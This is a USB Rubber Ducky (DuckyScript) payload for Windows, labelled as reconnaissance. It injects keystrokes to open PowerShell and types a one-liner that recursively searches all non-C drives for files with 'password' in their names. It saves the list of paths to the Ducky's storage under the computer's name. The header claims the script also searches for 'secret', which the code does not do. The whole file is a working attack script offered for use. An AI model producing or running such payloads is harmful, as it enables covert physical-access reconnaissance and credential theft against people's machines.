REM Title:		Secret File List
REM Description:	This will list all files that contain the words “password” or “secret”, excluding those from the C: drive. You can replace these keywords with your own search terms.
REM Author:		ih-hira
REM Target: 		Windows
REM Version: 		1.0
REM Category: 		RECON

ATTACKMODE HID STORAGE

DELAY 200
GUI r

DELAY 100
STRING powershell 
ENTER

DELAY 1000
STRING $m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter; Get-PSDrive -PSProvider FileSystem | Where-Object Name -ne 'C' | ForEach-Object { Get-ChildItem ($_.Name + ':\') -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'password' } | Select-Object -ExpandProperty FullName }>>$m':\'$env:computername'.txt'
ENTER

DELAY 100
STRING EXIT
ENTER

REM The drive letter of the volume with the label "DUCKY" is saved as $m.
REM It will take time, as it scans all the drives.
REM Keep in mind that the DUCKY drive has limited memory; if the file size exceeds the drive capacity, the file will not be saved.
REM The results of the command will be redirected (saved) to a file on the root of the "DUCKY" drive, saved as the computer name (in .txt format).